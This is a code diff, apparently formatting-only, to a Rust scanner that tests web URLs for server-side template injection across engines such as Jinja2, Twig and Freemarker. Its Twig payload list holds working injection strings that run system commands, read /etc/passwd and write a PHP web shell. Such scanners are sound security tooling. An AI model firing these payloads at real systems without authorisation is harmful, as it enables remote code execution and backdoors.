@@ -103,7 +103,10 @@ impl SstiAdvancedScanner {
         ];
 
         for (payload, indicator, description) in jinja2_payloads {
-            if let Some(vuln) = self.test_ssti_payload(url, payload, indicator, "Jinja2", description).await? {
+            if let Some(vuln) = self
+                .test_ssti_payload(url, payload, indicator, "Jinja2", description)
+                .await?
+            {
                 vulnerabilities.push(vuln);
                 break;
             }
@@ -126,16 +129,35 @@ impl SstiAdvancedScanner {
             ("{{dump(app)}}", "request", "App dump"),
             ("{{app.request.server.all}}", "DOCUMENT_ROOT", "Server vars"),
             (r#"{{['id']|filter('system')}}"#, "uid=", "System filter"),
-            (r#"{{['cat /etc/passwd']|filter('system')}}"#, "root:", "File read"),
-            (r#"{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"#, "uid=", "Filter callback RCE"),
-            (r#"{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}"#, "uid=", "System callback RCE"),
-            (r#"{{'<?php system($_GET[cmd]);?>'|file_put_contents('shell.php')}}"#, "shell.php", "File write"),
+            (
+                r#"{{['cat /etc/passwd']|filter('system')}}"#,
+                "root:",
+                "File read",
+            ),
+            (
+                r#"{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"#,
+                "uid=",
+                "Filter callback RCE",
+            ),
+            (
+                r#"{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}"#,
+                "uid=",
+                "System callback RCE",
+            ),
+            (
+                r#"{{'<?php system($_GET[cmd]);?>'|file_put_contents('shell.php')}}"#,
+                "shell.php",
+                "File write",
+            ),
             ("{{1*1}}{{5*5}}", "125", "Concatenation"),
             (r#"{{['id',1]|sort('system')|join}}"#, "uid=", "Sort system"),
         ];
 
         for (payload, indicator, description) in twig_payloads {
-            if let Some(vuln) = self.test_ssti_payload(url, payload, indicator, "Twig", description).await? {
+            if let Some(vuln) = self
+                .test_ssti_payload(url, payload, indicator, "Twig", description)
+                .await?
+            {
                 vulnerabilities.push(vuln);
                 break;
             }
@@ -165,7 +187,10 @@ impl SstiAdvancedScanner {
         ];
 
         for (payload, indicator, description) in freemarker_payloads {
-            if let Some(vuln) = self.test_ssti_payload(url, payload, indicator, "Freemarker", description).await? {
+            if let Some(vuln) = self
+                .test_ssti_payload(url, payload, indicator, "Freemarker", description)
+                .await?
+            {
                 vulnerabilities.push(vuln);
                 break;
             }
@@ -193,7 +218,10 @@ impl SstiAdvancedScanner {
         ];
 
         for (payload, indicator, description) in velocity_payloads {
-            if let Some(vuln) = self.test_ssti_payload(url, payload, indicator, "Velocity", description).await? {
+            if let Some(vuln) = self
+                .test_ssti_payload(url, payload, indicator, "Velocity", description)
+                .await?
+            {
                 vulnerabilities.push(vuln);
                 break;
             }
@@ -223,7 +251,10 @@ impl SstiAdvancedScanner {
         ];
 
         for (payload, indicator, description) in handlebars_payloads {
-            if let Some(vuln) = self.test_ssti_payload(url, payload, indicator, "Handlebars", description).await? {
+            if let Some(vuln) = self
+                .test_ssti_payload(url, payload, indicator, "Handlebars", description)
+                .await?
+            {
                 vulnerabilities.push(vuln);
                 break;
             }
@@ -251,7 +282,10 @@ impl SstiAdvancedScanner {
         ];
 
         for (payload, indicator, description) in pug_payloads {
-            if let Some(vuln) = self.test_ssti_payload(url, payload, indicator, "Pug", description).await? {
+            if let Some(vuln) = self
+                .test_ssti_payload(url, payload, indicator, "Pug", description)
+                .await?
+            {
                 vulnerabilities.push(vuln);
                 break;
             }
@@ -278,7 +312,10 @@ impl SstiAdvancedScanner {
         ];
 
         for (payload, indicator, description) in polyglot_payloads {
-            if let Some(vuln) = self.test_ssti_payload(url, payload, indicator, "Polyglot", description).await? {
+            if let Some(vuln) = self
+                .test_ssti_payload(url, payload, indicator, "Polyglot", description)
+                .await?
+            {
                 vulnerabilities.push(vuln);
                 break;
             }
@@ -302,7 +339,15 @@ impl SstiAdvancedScanner {
             Err(_) => return Ok(None),
         };
 
-        let test_params = vec!["name".to_string(), "template".to_string(), "content".to_string(), "message".to_string(), "comment".to_string(), "search".to_string(), "q".to_string()];
+        let test_params = vec![
+            "name".to_string(),
+            "template".to_string(),
+            "content".to_string(),
+            "message".to_string(),
+            "comment".to_string(),
+            "search".to_string(),
+            "q".to_string(),
+        ];
 
         for param in test_params {
             let test_url = if url.contains('?') {
@@ -315,12 +360,19 @@ impl SstiAdvancedScanner {
                 Ok(response) => {
                     // CRITICAL: Indicator must be NEW (not present in baseline)
                     // "49" appearing in baseline means it's not from template injection
-                    let indicator_is_new = response.body.contains(indicator) && !baseline.body.contains(indicator);
+                    let indicator_is_new =
+                        response.body.contains(indicator) && !baseline.body.contains(indicator);
 
                     if response.status_code == 200 && indicator_is_new {
-                        info!("{} SSTI detected via parameter '{}': {}", engine, param, description);
+                        info!(
+                            "{} SSTI detected via parameter '{}': {}",
+                            engine, param, description
+                        );
 
-                        let severity = if description.contains("RCE") || description.contains("exec") || description.contains("File read") {
+                        let severity = if description.contains("RCE")
+                            || description.contains("exec")
+                            || description.contains("File read")
+                        {
                             Severity::Critical
                         } else if description.contains("access") || description.contains("Config") {
                             Severity::High
@@ -414,7 +466,7 @@ impl SstiAdvancedScanner {
                  - Regular updates to template engine\n\
                  - Never render user-controlled templates"
             }
-            _ => "Follow OWASP guidelines for template injection prevention"
+            _ => "Follow OWASP guidelines for template injection prevention",
         };
 
         format!("{}{}", common, engine_specific)
@@ -449,7 +501,7 @@ mod uuid {
 mod tests {
     use super::*;
     use crate::detection_helpers::AppCharacteristics;
-use crate::http_client::HttpClient;
+    use crate::http_client::HttpClient;
     use std::sync::Arc;
 
     fn create_test_scanner() -> SstiAdvancedScanner {
